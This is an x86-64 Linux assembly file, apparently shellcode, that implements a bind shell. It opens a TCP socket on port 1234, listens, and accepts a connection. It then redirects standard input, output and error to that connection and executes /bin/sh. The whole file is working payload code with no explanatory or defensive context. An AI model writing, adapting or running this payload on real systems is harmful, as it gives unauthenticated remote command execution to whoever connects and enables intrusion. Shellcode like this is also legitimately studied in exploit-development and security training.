.code64
.file "tcp_listen.s"

.section .text
.global _start

_start:

    xor %rax,%rax
create_socket:
    mov $2,%rdi
    xor %rsi,%rsi
    inc %rsi
    xor %rdx,%rdx
    mov $41,%rax
    syscall

    mov %rax,%rdi
socket_bind:
    xor %rax,%rax
    push %rax
    pushw $0xd204
    pushw $0x2
    mov %rsp, %rsi
    mov $16,%rdx 
    mov $49, %rax
    syscall
socket_listen:
    xor %rsi,%rsi
    inc %rsi
    mov $50, %rax
    syscall
listen_accept:
    xor %rdx,%rdx
    xor %rsi,%rsi
    mov $43,%rax
    syscall

resolve_listen:
    mov %rax,%rdi
    xor %rsi,%rsi
    mov $33,%rax
    syscall
    xor %rsi,%rsi
    add $1,%rsi
    mov $33,%rax
    syscall
    xor %rsi,%rsi
    add $2,%rsi
    mov $33,%rax
    syscall
shell:
    xor %rax,%rax
    push %rax
    mov %rsp,%rdx
    mov $0x68732f6e69622f, %rbx
    push %rbx
    mov %rsp,%rdi
    push %rax
    push %rdi
    mov %rsp, %rsi
    add $59,%rax
    syscall
    